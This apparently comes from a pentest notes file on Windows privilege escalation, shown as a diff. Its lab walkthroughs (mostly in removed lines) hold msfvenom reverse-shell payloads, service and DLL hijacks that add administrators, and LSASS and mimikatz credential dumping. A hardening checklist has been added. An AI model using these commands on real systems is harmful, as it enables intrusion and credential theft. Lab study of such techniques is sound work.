-* You notice that you cannot swap out the legit exe, or modify the directory the exe is in, however you can edit the binpath
-
-```
-sc.exe config IObitUnSvr binPath= "C:\Users\dharding\Desktop\sliver.exe"
-[SC] ChangeServiceConfig SUCCESS
-PS C:\Windows\System32\spool\drivers\color> sc.exe start IObitUnSvr
-sc.exe start IObitUnSvr
-# get session
-[*] Session 12b37889 dante-dc01 - 10.10.14.2:52042 (LOCAL-WS02) - windows/amd64 - Tue, 07 May 2024 18:18:15 EDT
+### Notable Legacy Exploits
+- **MS10-092** (Server 2008 R2) - Task Scheduler XML Privilege Escalation
+- **MS16-032** (Windows 7/8.1, Server 2008/2012) - Secondary Logon Race Condition
+```powershell
+# MS16-032
+Import-Module .\Invoke-MS16-032.ps1
+Invoke-MS16-032
 ```
 
-### Startup Applications
+## Windows Hardening Checklist
+- Install OS from trusted media, keep patched (WSUS)
+- Apply Group Policy baselines (DISA STIGs, Microsoft Security Compliance Toolkit)
+- Enforce least privilege: remove users from local Administrators, use tiered admin accounts
+- Restrict PowerShell with Constrained Language Mode
+- Enable Credential Guard, LSA Protection, and Device Guard where possible
+- Disable LLMNR/NBT-NS
+- Implement LAPS for local admin password management
+- Enable and centralize logging (Sysmon, Windows Event Forwarding)
+- Disable unnecessary services and protocols (SMBv1, remote registry)
+- Enforce strong password policy and account lockout
+- Enable multi-factor authentication for privileged access
 
-* Detection
-* Windows VM
-* Open command prompt and type: icacls.exe
-
-```
-"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-```
-
-* From the output notice that the `BUILTIN\Users` group has full access `(F)` to the directory.
-* Exploitation
-* Kali VM
-* Open command prompt and type: `msfconsole`
-* In Metasploit (msf > prompt) type: `use multi/handler`
-* In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/shell_reverse_tcp`
-* In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
-* In Metasploit (msf > prompt) type: `run`
-* Open another command prompt and type: `msfvenom -p windows/shell_reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`
-* Copy the generated file, `x.exe`, to the Windows VM.
-* Windows VM
-* Place `x.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
-* Logoff.
-* Login with the administrator account credentials.
-* Kali VM
-* Wait for a session to be created, it may take a few seconds.
-* In Meterpreter(meterpreter > prompt) type: `getuid` or `whoami`
-* From the output, notice the user is `User-PC\Admin`
-
-### DLL Hijacking
-
-* Detection
-* Windows VM
-* Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
-* In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time.
-* Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on `Procmon.exe` and select `Run as administrator` from the menu.
-* In procmon, select `filter`. From the left-most drop down menu, select `Process Name`.
-* In the input box on the same line type: `dllhijackservice.exe`
-* Make sure the line reads `Process Name is dllhijackservice.exe` then `Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
-* Next, select from the left-most drop down menu `Result`.
-* In the input box on the same line type: `NAME NOT FOUND`
-* Make sure the line reads `Result is NAME NOT FOUND then Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
-* Open command prompt and type:
-
-```
-sc start dllsvc
-```
-
-* Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `C:\Temp\hijackme.dll` yet it could not do that as the file was not found. Note that `C:\Temp` is a writable location.
-* Exploitation
-* Windows VM
-* Copy `C:\Users\User\Desktop\Tools\Source\windows_dll.c` to the Kali VM.
-* Kali VM
-* Open `windows_dll.c` in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`
-* Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
-* Copy the generated file `hijackme.dll`, to the Windows VM.
-* Windows VM
-* Place hijackme.dll in `C:\Temp`.
-* Open command prompt and type: `sc stop dllsvc & sc start dllsvc`
-* It is possible to confirm that the `user` was added to the `local administrators group` by typing the following in the command prompt:
-
-```
-net localgroup administrators
-```
-
-### Service Escalation binPath
-
-* Detection
-* Windows VM
-* Open command prompt and type:
-
-```
-C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
-```
-
-* Notice that the output suggests that the user `User-PC\User` has the `SERVICE_CHANGE_CONFIG` permission.
-* Exploitation
-* Windows VM
-* In command prompt type: `sc config daclsvc binpath= "net localgroup administrators user /add"`
-* In command prompt type: `sc start daclsvc`
-* It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
-
-### Unquoted Service Path
-
-* Find vulnerable services with this command _without PowerUp_
-
-```
-Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
-```
-
-* Open command prompt and type: `sc qc unquotedsvc`
-* Notice that the `BINARY_PATH_NAME` field displays a path that is not confined between quotes.
-* Exploitation
-* Kali VM
-* Open command prompt and type: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
-* Copy the generated file, `common.exe`, to the Windows VM.
-* Windows VM
-* Place common.exe in `"C:\Program Files\Unquoted Path Service"`.
-* Open command prompt and type: `sc start unquotedsvc`
-* It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
-
-### Hot Potato
-
-* Exploitation
-* Windows VM
-* In command prompt type: `powershell.exe -nop -ep bypass`
-* In Power Shell prompt type: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
-* In Power Shell prompt type: `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
-* To confirm that the attack was successful, in Power Shell prompt type: `net localgroup administrators`
-
-### Password Mining Escalation Configuration Files
-
-* Exploitation
-* Windows VM
-* Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
-* Scroll down to the `"<Password>"` property and copy the base64 string that is confined between the `"<Value>"` tags underneath it.
-* Kali VM
-* In a terminal, type: `echo [copied base64] | base64 -d`
-* Notice the cleartext password
-
-### Password Mining Escalation Memory
-
-* Exploitation
-* Kali VM
-* Open command prompt and type: `msfconsole`
-* In Metasploit (msf > prompt) type: `use auxiliary/server/capture/http_basic`
-* In Metasploit (msf > prompt) type: `set uripath x`
-* In Metasploit (msf > prompt) type: `run`
-* Windows VM
-* Open Internet Explorer and browse to: `http://[Kali VM IP Address]/x`
-* Open command prompt and type: taskmgr
-* In Windows Task Manager, right-click on the `iexplore.exe` in the `Image Name` columnand select `Create Dump File` from the popup menu.
-* Copy the generated file, `iexplore.DMP`, to the Kali VM.
-* Kali VM
-* Place `iexplore.DMP` on the desktop.
-* Open command prompt and type: strings `/root/Desktop/iexplore.DMP | grep "Authorization: Basic"`
-* Select the Copy the Base64 encoded string.
-* In command prompt type: `echo -ne [Base64 String] | base64 -d`
-* Notice the credentials in the output.
-
-### Kernal Exploits
-
-* Establish a shell
-* Kali VM
-* Open command prompt and type: `msfconsole`
-* In Metasploit (msf > prompt) type: `use multi/handler`
-* In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
-* In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
-* In Metasploit (msf > prompt) type: `run`
-* Open an additional command prompt and type: `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe`
-* Copy the generated file, `shell.exe`, to the Windows VM.
-* Windows VM
-* Execute `shell.exe` and obtain reverse shell
-* Detection & Exploitation
-* Kali VM
-* In Metasploit (msf > prompt) type: `run post/multi/recon/local_exploit_suggester`
-* Identify `exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation`
-* In Metasploit (msf > prompt) type: `use exploit/windows/local/ms16_014_wmi_recv_notif`
-* In Metasploit (msf > prompt) type: `set SESSION [meterpreter SESSION number]`
-* In Metasploit (msf > prompt) type: `set LPORT 5555`
-* In Metasploit (msf > prompt) type: `run`
-
-### LSASS Credential Dumping
-
-* use `procdump`&#x20;
-
-```
-procdump.exe -accepteula -ma lsass.exe C:\Users\Administrator\Desktop\lsass.dmp
-#either exfil or perform locally 
-mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords
-```
-
-### LaZagne (Windows Credential Extraction)
-
-```
-start LaZagne.exe all
-```
-
-Modules: browsers, chats, mails, memory, sysadmin, windows, wifi.
-
-### Credential Search Terms
-
-Key terms to search for in files and configs: `Passwords`, `Passphrases`, `Keys`, `Username`, `Creds`, `Users`, `Passkeys`, `configuration`, `dbcredential`, `dbpassword`, `pwd`, `Login`, `Credentials`
-
-### Additional Credential Locations
-
-* Passwords in Group Policy (SYSVOL share)
-* `web.config` files on dev machines
-* `unattend.xml`
-* AD user/computer description fields
-* KeePass databases (`*.kdbx`)
-* Files named `pass.txt`, `passwords.docx`, etc.
+## Resources
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+- https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+- https://github.com/hfiref0x/UACME
+- https://lolbas-project.github.io/
+- https://wadcoms.github.io/
+- https://ppn.snovvcrash.rocks/pentest/infrastructure/post-exploitation
